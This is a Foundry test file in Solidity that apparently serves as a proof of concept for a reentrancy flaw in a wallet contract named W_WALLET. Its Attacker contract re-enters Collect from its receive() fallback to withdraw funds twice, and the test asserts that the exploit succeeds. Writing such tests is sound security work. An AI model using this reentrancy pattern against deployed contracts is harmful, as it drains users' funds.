
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {W_WALLET, Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {

    W_WALLET public wallet;
    
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        wallet = new W_WALLET(address(log));
        
        _attacker = new Attacker(address(wallet));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= wallet.MinSum());
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        vm.deal(address(wallet), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public wallet;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public reentryAmount;

    constructor(address victimAddress) { 
        wallet = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        reentryAmount = val;
        
        wallet.Put{value: val * 2}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        wallet.Collect(val);

        uint256 finalBalance = address(this).balance;
        if (attackCallCount == 2 && finalBalance == initialSnapshot + val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            wallet.Collect(reentryAmount);
        }
    }
}
